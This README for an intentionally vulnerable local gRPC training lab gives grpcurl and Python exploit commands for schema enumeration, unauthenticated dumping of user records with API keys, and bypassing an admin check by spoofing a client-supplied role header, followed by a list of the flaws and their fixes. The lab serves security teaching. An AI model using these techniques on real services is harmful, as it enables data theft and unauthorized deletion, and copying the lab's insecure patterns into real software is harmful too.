# gRPC Lab

**Beyond the Lab** extension — a vulnerable gRPC service (HTTP/2 + protobuf),
run as a **separate process** from the Flask app.

## Setup

```bash
cd grpc-lab
pip install grpcio grpcio-tools grpcio-reflection

# generate stubs from the .proto (creates socialhack_pb2*.py)
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. socialhack.proto

# run the server (listens on :50051)
python server.py
```

## Exploit — with grpcurl (recommended)

Install [grpcurl](https://github.com/fullstorydev/grpcurl), then:

```bash
# 1. Reflection: enumerate the schema WITHOUT the .proto (like GraphQL introspection)
grpcurl -plaintext localhost:50051 list
grpcurl -plaintext localhost:50051 describe socialhack.UserService

# 2. No auth — dump any user (admin api_key + AWS key in notes)
grpcurl -plaintext -d '{"id":4}' localhost:50051 socialhack.UserService/GetUser

# 3. No auth — full user list
grpcurl -plaintext localhost:50051 socialhack.UserService/ListUsers

# 4. "admin only" DeleteUser — denied without metadata...
grpcurl -plaintext -d '{"id":2}' localhost:50051 socialhack.UserService/DeleteUser
# ...bypassed by SPOOFING the trusted role metadata:
grpcurl -plaintext -H 'role: admin' -d '{"id":2}' localhost:50051 socialhack.UserService/DeleteUser
```

## Exploit — with a Python client (no grpcurl needed)

```python
import grpc, socialhack_pb2 as pb, socialhack_pb2_grpc as pbg
ch = grpc.insecure_channel("localhost:50051", options=[("grpc.enable_http_proxy", 0)])
stub = pbg.UserServiceStub(ch)

print(stub.GetUser(pb.UserId(id=4)).api_key)                 # no auth
print([u.username for u in stub.ListUsers(pb.Empty()).users]) # full dump
stub.DeleteUser(pb.UserId(id=2), metadata=(("role", "admin"),))  # metadata spoof
```

## Vulnerabilities

1. **No authentication** on any RPC — no interceptor, no token required.
2. **Server reflection enabled** — schema enumerable without the `.proto`
   (gRPC's version of GraphQL introspection).
3. **Spoofable metadata trust** — `DeleteUser` "admin only" check reads a
   client-supplied `role` metadata header (no cryptographic binding) — same
   flaw class as the JWT/BFLA labs.
4. **Excessive data exposure** — `api_key` / `internal_notes` returned in every
   `User` message.
5. **No TLS** (`add_insecure_port`) — traffic is interceptable.

## Remediation

- Require authentication via a server interceptor (validate a real token, not a
  self-asserted role); bind identity cryptographically (mTLS).
- Disable reflection in production.
- Enforce authorization from a trusted source, never from client metadata.
- Use TLS (`add_secure_port`) and field-level output control.
